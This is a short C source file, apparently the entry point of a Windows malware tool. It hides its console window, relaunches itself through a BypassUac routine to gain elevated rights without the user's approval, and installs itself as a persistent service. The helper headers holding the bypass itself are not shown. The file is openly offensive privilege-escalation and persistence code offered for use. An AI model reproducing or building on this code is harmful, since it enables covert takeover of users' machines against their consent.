#include "Services.h"
#include "BypassUac.h"

#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

void main(int argc,char *argv[])
{  
	char chpath[MAX_PATH];

    if( lstrcmpiA(argv[1], "install") == 0 )
	{
		InstallService();
		RunService();
        return;
    }
	else if( lstrcmpiA(argv[1], "bypass") == 0 ){
		GetModuleFileName(NULL,(LPSTR)chpath,sizeof(chpath));  
		strcat_s(chpath," install");
		printf("%s",chpath);
		BypassUac(chpath);
	}
	else{
		initSvc();
	}

}